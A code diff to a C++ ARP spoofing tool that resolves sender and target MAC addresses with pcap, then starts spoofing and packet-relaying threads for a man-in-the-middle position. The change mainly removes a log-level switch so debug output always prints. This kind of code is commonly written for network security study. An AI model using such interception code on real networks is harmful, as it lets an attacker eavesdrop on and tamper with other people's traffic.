@@ -13,8 +13,6 @@
 
 using namespace std;
 
-#define LOG_LEVEL_DEBUG 1
-#define LOG_LEVEL_INFO 0
 #define PCAP_ERR_BUF_SIZE 1024
 #define PACK_BUF_SIZE 1024 * 64
 #define ARP_SPOOFING_PERIOD 1
@@ -26,15 +24,12 @@ static vector<IPv4_addr> sender_ips;
 static vector<IPv4_addr> target_ips;
 static vector<MAC_addr> sender_macs;
 static vector<MAC_addr> target_macs;
-static int log_level = LOG_LEVEL_INFO;
 
 void thread_spoofing();
 void thread_relaying();
 
 int main(int argc, char *argv[]) 
-{
-	char *log_level_str = getenv("LOG_LEVEL");
-	
+{	
 	char errbuf[PCAP_ERR_BUF_SIZE];
 	char *if_name;
 
@@ -53,84 +48,56 @@ int main(int argc, char *argv[])
 		target_ips.push_back(argv[i+1]);
 	}
 
-	if (log_level_str != NULL) 
+
+	for (u_int i=0; i < sender_ips.size(); i++) 
 	{
-		log_level=atoi(log_level_str);
+		cout << "Sender_IP [" << i+1 << "] - ";
+		sender_ips[i].ascii_dump();
+		cout << endl;
+	}
+	for (u_int i=0; i < target_ips.size(); i++) 
+	{
+		cout << "Target_IP [" << i+1 << "] - ";
+		target_ips[i].ascii_dump();
+		cout << endl;
 	}
 
-	if (log_level >= LOG_LEVEL_DEBUG) 
-	{
-		for (u_int i=0; i < sender_ips.size(); i++) 
-		{
-			cout << "Sender_IP [" << i << "] - ";
-			sender_ips[i].ascii_dump();
-			cout << endl;
-		}
-		for (u_int i=0; i < target_ips.size(); i++) 
-		{
-			cout << "Target_IP [" << i << "] - ";
-			target_ips[i].ascii_dump();
-			cout << endl;
-		}
-	}
 
 	// Get My Network Information
 	get_my_ip_str(if_name, my_ip_addr);
 	get_my_mac_str(if_name, my_mac_addr);
-	if (log_level >= LOG_LEVEL_DEBUG) 
-	{
-		cout << "My IPv4 address is ";
-		my_ip_addr.ascii_dump();
-		cout << endl;
-		cout << "My MAC address is ";
-		my_mac_addr.hex_dump();
-		cout << endl;
-	}
+		
+	cout << "My IPv4 address is ";
+	my_ip_addr.ascii_dump();
+	cout << endl;
+	cout << "My MAC address is ";
+	my_mac_addr.hex_dump();
+	cout << endl;
 
 	handle = pcap_open_live(if_name, PACK_BUF_SIZE, 0, 1, errbuf);
 	if (handle == NULL) 
 	{
-		printf("Interface Open Error\n");
+		printf("Interface Open Error %s : %s\n", if_name, errbuf);
 		exit(EXIT_FAILURE);
 	}
-	if (log_level >= LOG_LEVEL_DEBUG) 
-	{
-		printf("Interface Open Success");
-	}
 
-	//Gathering Sender MAC Address
-	if (log_level >= LOG_LEVEL_DEBUG) 
-	{
-		printf("Gathering MAC Address of Sender IP Address owner\n");
-	}
 	for (u_int i = 0; i < sender_ips.size(); i++) 
 	{
 		auto sender_ip = sender_ips[i];
-		if (log_level >= LOG_LEVEL_DEBUG) 
-		{
-			printf("[%2u/%2lu]Gathering Sender's MAC addr: ", i, sender_ips.size());
-			sender_ip.ascii_dump();
-			putchar('\n');
-			printf("Try to Send ARP request...\n");
-		}
+		sender_ip.ascii_dump();
+		putchar('\n');
+		printf("Try to Send ARP request...\n");
+		
 		// Send ARP Request
 		int send_status = send_arp_request(handle, my_mac_addr, my_ip_addr, sender_ip);
 		if (send_status == EXIT_SUCCESS) 
 		{
-			if (log_level >= LOG_LEVEL_DEBUG) 
-			{
-				printf("Send ARP Request Success\n");
-			}
+			printf("Send ARP Request Success\n");
 		} 
 		else 
 		{
 			printf("Send ARP Request Failed\n");
 			return EXIT_FAILURE;
-		}
-
-		if (log_level >= LOG_LEVEL_DEBUG) 
-		{
-			printf("Try to Receive ARP reqly...\n");
 		}
 
 
@@ -139,10 +106,7 @@ int main(int argc, char *argv[])
 		int recv_status = recv_arp_reply(handle, sender_ip, tmp_mac);
 		if (recv_status == EXIT_SUCCESS) 
 		{
-			if (log_level >= LOG_LEVEL_DEBUG) 
-			{
-				printf("Receive ARP Reply Success\n");
-			}
+			printf("Receive ARP Reply Success\n");
 		} 
 		else 
 		{
@@ -151,35 +115,28 @@ int main(int argc, char *argv[])
 		}
 		
 		sender_macs.push_back(tmp_mac);
-		if (log_level >= LOG_LEVEL_DEBUG) 
-		{
-			printf("* Store MAC address ");
-			tmp_mac.hex_dump();
-			cout << " = ";
-			sender_ip.ascii_dump();
-			cout << endl;
-		}
+			
+		printf("* Store MAC address ");
+		tmp_mac.hex_dump();
+		cout << " = ";
+		sender_ip.ascii_dump();
+		cout << endl;
 	}
 
 	//Gathering Target MAC address
 	for (u_int i = 0; i < target_ips.size(); i++) 
 	{
 		auto target_ip = target_ips[i];
-		if (log_level >= LOG_LEVEL_DEBUG) 
-		{
-			printf("[%2u/%2lu]Gathering Target's MAC addr: ", i, target_ips.size());
-			target_ip.ascii_dump();
-			putchar('\n');
-			printf("Try to Send ARP request...\n");
-		}
+		printf("[%2u/%2lu]Gathering Target's MAC addr: ", i, target_ips.size());
+		target_ip.ascii_dump();
+		putchar('\n');
+		printf("Try to Send ARP request...\n");
+	
 		// Send ARP Request
 		int send_status = send_arp_request(handle, my_mac_addr, my_ip_addr, target_ip);
 		if (send_status == EXIT_SUCCESS) 
 		{
-			if (log_level >= LOG_LEVEL_DEBUG) 
-			{
-				printf("Send ARP Request Success\n");
-			}
+			printf("Send ARP Request Success\n");
 		} 
 		else 
 		{
@@ -188,20 +145,12 @@ int main(int argc, char *argv[])
 		}
 
 
-		if (log_level >= LOG_LEVEL_DEBUG) 
-		{
-			printf("Try to Receive ARP reqly...\n");
-		}
-		
 		MAC_addr tmp_mac;
 		// Receive ARP Reply
 		int recv_status = recv_arp_reply(handle, target_ip, tmp_mac);
 		if (recv_status == EXIT_SUCCESS) 
 		{
-			if (log_level >= LOG_LEVEL_DEBUG) 
-			{
-				printf("Receive ARP Reply Success\n");
-			}
+			printf("Receive ARP Reply Success\n");
 		} 
 		else 
 		{
@@ -210,14 +159,11 @@ int main(int argc, char *argv[])
 		}
 
 		target_macs.push_back(tmp_mac);
-		if (log_level >= LOG_LEVEL_DEBUG) 
-		{
-			printf("* Store MAC address ");
-			tmp_mac.hex_dump();
-			cout << " = ";
-			target_ip.ascii_dump();
-			cout << endl;
-		}
+		printf("* Store MAC address ");
+		tmp_mac.hex_dump();
+		cout << " = ";
+		target_ip.ascii_dump();
+		cout << endl;
 	}
 
 	thread spoofing_thread(thread_spoofing);
@@ -249,7 +195,7 @@ void thread_relaying()
 	while(true) 
 	{
 		int status = pcap_next_ex(handle, &header_ptr, &pkt_data);
-		// No Packet
+		// Check Status
 		if (status == 0) 
 			continue; 
 		else if (status == -1) 
@@ -279,17 +225,17 @@ void thread_relaying()
 		src_ip.parse_mem((char*)&ip_hdr->ip_src);
 		if (!my_ip_addr.is_equal(dst_ip)) 
 		{ 
-			if (log_level >= LOG_LEVEL_DEBUG) 
-			{
-				cout << "This Pack is not for me Destination IP: ";
-				dst_ip.ascii_dump();
-				cout << endl;
-				cout << "Source IP: ";
-				src_ip.ascii_dump();
-				cout << endl;
-			}
+
+			cout << "This Pack is not for me Destination IP: ";
+			dst_ip.ascii_dump();
+			cout << endl;
+			cout << "Source IP: ";
+			src_ip.ascii_dump();
+			cout << endl;
+		
 			
-			for (u_int i = 0; i < sender_ips.size(); i++) { 
+			for (u_int i = 0; i < sender_ips.size(); i++) 
+			{ 
 				auto sender_ip = sender_ips[i];
 				if (sender_ip.is_equal(src_ip)) 
 				{
@@ -304,10 +250,7 @@ void thread_relaying()
 					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) 
 						printf("Sendpacket Error \n"); 
 					else 
-					{
-						if (log_level >= LOG_LEVEL_DEBUG) 
-							printf("Packet Relay Success!\n");
-					}
+						printf("Packet Relay Success!\n");
 					break;
 				}
 
@@ -323,10 +266,7 @@ void thread_relaying()
 					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) 
 						printf("Sendpacket Error\n");
 					else 
-					{
-						if (log_level >= LOG_LEVEL_DEBUG) 
-							printf("Packet relay Success!\n");
-					}
+						printf("Packet relay Success!\n");
 					break;
 				}
 			}
